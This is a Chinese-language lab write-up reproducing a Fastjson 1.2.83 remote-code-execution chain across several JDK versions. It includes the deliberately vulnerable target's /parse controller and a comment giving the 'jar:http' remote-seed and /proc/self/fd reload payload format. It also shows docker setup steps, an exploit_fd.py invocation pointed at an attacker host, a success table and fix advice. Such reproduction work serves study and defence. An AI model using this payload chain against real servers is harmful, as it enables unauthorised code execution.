|     |     |     |
| --- | --- | --- |  
| 文件  | 职责  | 与漏洞的关系 |
| `BoundEnvelope.java` | 定义固定 DTO，提供 `List<Object> value`<br><br>通道 | 让多个 `@type`<br><br>能在一次请求中被处理 |
| `ModernFdApplication.java` | 启动时强制 autoType=false，支持 safeMode 开关 | 保证实验前提正确 |
| `ParseController.java` | `/parse`<br><br>接口执行 `JSON.parseObject(body, BoundEnvelope.class)` | **真正的 Sink** ，触发 checkAutoType 探测 |

```java
// ==============================================================================
// 文件 3：ParseController.java
// 作用：唯一的漏洞触发入口，模拟真实业务中的「固定 DTO 绑定」场景
// ==============================================================================
package lab.modernfd;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

/**
 * 靶场唯一对外接口。
 *
 * /health  → 返回当前运行时信息（版本、ClassLoader、safeMode 等）
 * /parse   → 真正的漏洞触发点，使用固定 DTO 绑定解析用户输入
 */
@RestController
public final class ParseController {

    /** 成功利用后会在系统属性中留下的标记键（由恶意类的 <clinit> 写入） */
    private static final String MARKER_KEY = "FASTJSON_MODERN_FD_MARKER";

    /**
     * 健康检查 / 环境信息接口。
     * 用于确认靶场是否按预期启动（autoType=false、ClassLoader 正确等）。
     */
    @GetMapping(value = "/health", produces = MediaType.APPLICATION_JSON_VALUE)
    public Map<String, Object> health() {
        return runtimeFacts();
    }

    /**
     * ============================================================
     *  真正的漏洞触发点（Sink）
     * ============================================================
     *
     * 使用固定类型绑定：
     *     JSON.parseObject(body, BoundEnvelope.class)
     *
     * 这是实验室要验证的核心安全声明：
     * 「即使绑定到具体 DTO + autoType 关闭，在 LaunchedClassLoader
     *  环境下仍然可能被 @JSONType 探测路径利用」。
     *
     * 请求体期望格式：
     * {
     *   "value": [
     *     {"@type": "jar:http://..."},          // 第一阶段：远程 seed
     *     {"@type": "jar:file:/proc/self/fd/N!/..."}, // 后续阶段：FD 二次加载
     *     ...
     *   ]
     * }
     */
    @PostMapping(value = "/parse", consumes = MediaType.APPLICATION_JSON_VALUE,
                 produces = MediaType.APPLICATION_JSON_VALUE)
    public Map<String, Object> parse(@RequestBody String body) {
        // 先收集当前运行时基础信息
        Map<String, Object> result = runtimeFacts();
        result.put("bodyBytes", body.getBytes(java.nio.charset.StandardCharsets.UTF_8).length);

        try {
            // -------------------- 关键 Sink --------------------
            // 类型绑定解析。这里就是整个漏洞的入口。
            // 即使 BoundEnvelope 本身完全无害，checkAutoType 仍会
            // 对 value 列表里的每个 @type 执行 getResourceAsStream 探测。
            final BoundEnvelope parsed = JSON.parseObject(body, BoundEnvelope.class);
            // ---------------------------------------------------

            result.put("ok", true);
            result.put("parsedClass", parsed == null ? null : parsed.getClass().getName());
            result.put("valueSize", parsed == null || parsed.getValue() == null
                       ? null : parsed.getValue().size());
        } catch (Throwable failure) {
            // 捕获所有异常（包括类加载失败、命令执行异常、语法错误等）
            result.put("ok", false);
            result.put("errorClass", failure.getClass().getName());
            result.put("errorMessage", failure.getMessage());
        }

        // 检查恶意类是否成功写入了标记（证明 <clinit> 已执行）
        result.put("marker", System.getProperty(MARKER_KEY));

        // 收集当前进程中与 jar_cache 相关的文件描述符
        // 用于观察「远程 JAR 是否被缓存并留下了打开的 FD」
        result.put("jarCacheFds", jarCacheDescriptors());

        // 打印完整结果，方便 docker logs 观察
        System.out.println("PARSE_RESULT=" + JSON.toJSONString(result));
        return result;
    }

    /**
     * 收集当前 Fastjson / JVM / ClassLoader 的关键运行时信息。
     * 这些信息用于确认实验环境是否符合预期。
     */
    private static Map<String, Object> runtimeFacts() {
        ParserConfig config = ParserConfig.getGlobalInstance();
        Map<String, Object> facts = new LinkedHashMap<>();

        facts.put("fastjson", JSON.VERSION);
        facts.put("java", System.getProperty("java.runtime.version"));
        facts.put("autoType", config.isAutoTypeSupport());
        facts.put("safeMode", config.isSafeMode());

        // 记录几个关键 ClassLoader，确认是 Spring Boot 的 LaunchedClassLoader
        facts.put("parserLoader", loaderName(ParserConfig.class.getClassLoader()));
        facts.put("dtoLoader", loaderName(BoundEnvelope.class.getClassLoader()));
        facts.put("contextLoader", loaderName(Thread.currentThread().getContextClassLoader()));
        facts.put("configuredDefaultLoader", loaderName(config.getDefaultClassLoader()));

        facts.put("marker", System.getProperty(MARKER_KEY));
        return facts;
    }

    /** 安全获取 ClassLoader 名称 */
    private static String loaderName(ClassLoader loader) {
        return loader == null ? null : loader.getClass().getName();
    }

    /**
     * 扫描 /proc/self/fd，找出指向 jar_cache 的文件描述符。
     *
     * 这是 modern-fd 路径的重要观测点：
     * 当第一阶段 remote JAR 被成功拉取后，JVM 往往会把 JAR 缓存到
     * 临时文件，并留下一个仍然打开的 FD。
     * 后续攻击阶段就是利用这些 FD 编号进行二次加载。
     *
     * 返回格式示例：
     *   ["12->/tmp/jar_cache1234567890.tmp", "15->/tmp/jar_cache..."]
     */
    private static List<String> jarCacheDescriptors() {
        List<String> matches = new ArrayList<>();
        Path fdRoot = Path.of("/proc/self/fd");

        // 非 Linux 环境直接返回空
        if (!Files.isDirectory(fdRoot)) {
            return matches;
        }

        try (var entries = Files.list(fdRoot)) {
            entries.sorted().forEach(entry -> {
                try {
                    // 读取软链接指向的真实路径
                    String target = Files.readSymbolicLink(entry).toString();
                    // 只关心包含 jar_cache 的描述符
                    if (target.contains("jar_cache")) {
                        matches.add(entry.getFileName() + "->" + target);
                    }
                } catch (IOException ignored) {
                    // FD 可能在扫描过程中被关闭，忽略即可
                }
            });
        } catch (IOException ignored) {
            // 整体扫描失败也不影响主流程
        }
        return matches;
    }
}
```

## JDK 21 复现（fd 模式）

## 靶机

```bash
cd ./Fastjson1.2.83_RCE_Full_Version/target/jdk21
docker build -t modern-fd-target-21 .
docker run -d --name fd-target-21 -p 8080:8080 modern-fd-target-21
```

### 靶机docker日志

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e8c87f6036e5bb1d.png)

## 攻击机

```bash
# 同模式可以直接使用JDK 17版本生成的恶意类
python3 ./RCE/poc/exploit_fd.py 攻击机ip 8080 http://靶机ip:8080 /parse --mode fd --tag t1784975521_fd
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/44d6e6ceddea7027.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f2cb005430d4c129.png)

手动攻击方式同JDK 17

## JDK 25 复现（fd 模式）

## 靶机

```bash
cd ./Fastjson1.2.83_RCE_Full_Version/target/jdk21
docker build -t modern-fd-target-25 .
docker run -d --name fd-target-25 -p 8080:8080 modern-fd-target-25
```

### 靶机docker日志

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8f757e0fb67bdb02.png)

## 攻击机

```bash
# 同模式可以直接使用JDK 17版本生成的恶意类
python3 ./RCE/poc/exploit_fd.py 攻击机ip 8080 http://靶机ip:8080 /parse --mode fd --tag t1784975521_fd
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/719c6bdbd830b5b1.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ecf0d86e9b886eec.png)

手动攻击方式同JDK 17

## 全版本复现结果总结

|     |     |     |     |     |
| --- | --- | --- | --- | --- |    
| **JDK 版本** | **精确版本** | **模式** | **SSRF** | **RCE（文件写入）** |
| JDK 8 | 1.8.0_492 | jdk8-http | 成功  | 成功  |
| JDK 17 | 17.0.19 | fd  | 成功  | 成功  |
| JDK 21 | 21.0.11 | fd  | 成功  | 成功  |
| JDK 25 | 25.0.3 | fd  | 成功  | 成功  |

## 修复建议

1.  **启用 SafeMode** ： `-Dfastjson.parser.safeMode=true`
2.  升级 fastjson 到 1.2.84 或迁移到 fastjson2
3.  拦截包含 `jar:http` 的请求

## 致谢

> https://github.com/DmTomHL/fastjson-1.2.83-gadget-rce
> 
> https://github.com/dinosn/fastjson-jsontype-rce-lab
